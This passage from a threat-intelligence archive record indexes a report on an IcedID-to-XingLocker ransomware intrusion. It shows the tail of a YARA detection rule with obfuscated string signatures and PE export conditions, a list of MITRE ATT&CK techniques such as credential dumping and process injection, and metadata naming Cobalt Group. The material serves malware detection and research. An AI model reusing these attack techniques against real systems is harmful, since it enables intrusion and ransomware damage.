protected]@x<tFy>yElExEyEr=wAy>u;v9k>w=mAyGk;x=pBuGs>tBrEw>wBmFx?v;sGtGn>w\"\nascii\n   $s10 = \":w:x>qCoFx;wCqGr;o;p;[email protected]\n[email protected]=n<[email protected]=x?x=u;[email protected]<j9n<k;l;\n[email protected]<[email protected]<r:j9tEq;[email protected];l:uFs:\n[email protected];q:v>pGw:j?n\" ascii\n   $s11 =\n\"HoHuHkAjFkFjEpFqFpApAoGvEpFwEoEjElEyEuBjGoFwEkBnHqEnFrEyEtFyEsBvHyEuFkCnCwCqGkGrGoCyC\n ascii\n   $s12 = \"EsHv:y;j;k;l;m;nEyEn;q;r;s;t;u;vFmEv;y<j<k<l<m<n?\n\n```\n\n-----\n\n```\nqFn<q<r<s<t<u<v yFy<y j k l m nEwCq q r s t u vFqCy y>j>k>l>m>n>o>p>q>r>s>t>u>v \nascii\n   $s13 =\n\"ByBwByCkCqCoCqCkCyCwCyCkCqCoCqCkCxCxCxDlDpDpDpDlDxDxDxDlDpDpDpDlDyDxDyEjEkElEmEnEoEpE\n ascii\n   $s14 =\n\"GoHuByCjCkClCmCnErFyFnFsEoExApElFsAjEtErFnDlDmDnFrEyEnEsFoFxBpFmEwEtBkCoDsCqEmEnCkCnC\n ascii\n   $s15 =\n\"CqBxBpCjAnClFjCnCrCpCwCrCsCtCuCvGxCxGlDjHoDlHyDnHvDpHsDrHvDtAkDvDnDxBtEjDlElExEnEyEpE\n ascii\n   $s16 = \">p:yGp?l?k?l?m;k>pCp>[email protected];u?w?xGtDj9o=r<[email protected]\n<tHtHn>[email protected]@[email protected]\n<pHvGnCoClAmEv9rFlCmDrEr<[email protected]:j>pGmAv:r;pDy:v\" ascii\n   $s17 = \";oGs;k<[email protected]>j=uCpHk>[email protected]?k>\n[email protected]>vDk<v?\nkEyDq<[email protected]=vArExGr9m<qEtBr<[email protected]>o:kCpEuFuAl;j;nBjFpHj;u;y\"\nascii\n   $s18 = \";k<t>y?j;wGy;j?oFy?x?q?r?s;[email protected]:w:\n[email protected]@l<uHyCw<[email protected]@[email protected]@x<q9uEwCpDuEr9rEtCmDvEo9\nxAq:oHjBoBp:v?r:v>tGyAk\" ascii\n   $s19 = \"HwByAjCkDyCmDyDuDr;o;u;[email protected]>\n[email protected]:lHy9o9k9l=uAs>jGpDx9v9r9t9uHm:rDo;k:j:kBsEuGu9j;w<r:r:s>lBp>k\"\nascii\n   $s20 = \"AwBp>v;nCkDw;j;[email protected]@s:[email protected]\n<r<[email protected]=lAp9k;k<t9y:jGx9q;o>l:o:p>yBo>o<x;uGm\" ascii\n  condition:\n   uint16(0) == 0x5a4d and filesize < 500KB and\n   ( pe.imphash() == \"309f189ae3d618bfd1e08a8538aea73a\" and (\npe.exports(\"MkozycymwrxdxsUdddknsoskqjj\") and\npe.exports(\"NnzvpyfnjzgjflhXgbihjsjauma\") and pe.exports(\"StartW\") and\npe.exports(\"WldxpodTdikvburej\") and pe.exports(\"WqtzhacNqtdeAkecz\") and\npe.exports(\"startW\") ) or 8 of them )\n}\n\n### MITRE\n\n#### OS Credential Dumping – T1003 SMB/Windows Admin Shares – T1021.002 System Owner/User Discovery – T1033 Network Service Scanning – T1046 Windows Management Instrumentation – T1047 Scheduled Task/Job – T1053 Process Injection – T1055 PowerShell – T1059.001 Domain Groups – T1069.002 File and Directory Discovery – T1083 Access Token Manipulation – T1134 Network Share Discovery – T1135 Domain Trust Discovery – T1482 Data Encrypted for Impact – T1486\n\n```\n\n-----\n\n#### Security Software Discovery – T1518.001 Disable or Modify Tools – T1562.001\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-10-18 - IcedID to XingLocker Ransomware in 24 hours.pdf"
    ],
    "report_names": [
        "2021-10-18 - IcedID to XingLocker Ransomware in 24 hours.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535676,
    "ts_updated_at": 1743041358,
    "ts_creation_date": 1653761068,
    "ts_modification_date": 1653761068,
    "files": {
        "pdf": "https://archive.orkl.eu/f83f00994854404c02adf8ad9cf80a6293b3cded.pdf",
        "text": "https://archive.orkl.eu/f83f00994854404c02adf8ad9cf80a6293b3cded.txt",
        "img": "https://archive.orkl.eu/f83f00994854404c02adf8ad9cf80a6293b3cded.jpg"
    }
}